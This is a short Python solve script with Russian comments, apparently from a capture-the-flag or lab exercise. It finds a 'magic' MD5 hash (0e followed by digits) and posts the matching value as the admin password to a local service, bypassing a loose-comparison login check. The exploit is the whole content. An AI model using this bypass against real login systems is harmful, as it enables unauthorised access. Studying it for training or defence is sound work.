# Искомое число - 240610708, поиск занимает около 3 минут
import hashlib
import re
import requests


def is_valid_string(s):
    # Проверка, содержит ли строка только цифры
    return re.fullmatch(r"[0-9]+", s) is not None


def find_md5_with_prefix(prefix):
    i = 0
    while True:
        # Генерируем строку для хеширования
        test_string = f"{i}"

        # Вычисляем MD5-хеш
        md5_hash = hashlib.md5(test_string.encode()).hexdigest()

        # Проверяем, начинается ли хеш с нужного префикса
        if md5_hash.startswith(prefix) and is_valid_string(md5_hash[2:]):
            return test_string, md5_hash

        i += 1


# Ищем строку, чей MD5-хеш начинается с "0e"
prefix = "0e"
result_string, result_hash = find_md5_with_prefix(prefix)

print(f"Найдена строка: {result_string}")  # 240610708
print(f"MD5-хеш: {result_hash}")

resp = requests.post("http://127.0.0.1:1337/process", data={"username": "admin", "password": result_string})
print(resp.status_code)
print(resp.content)
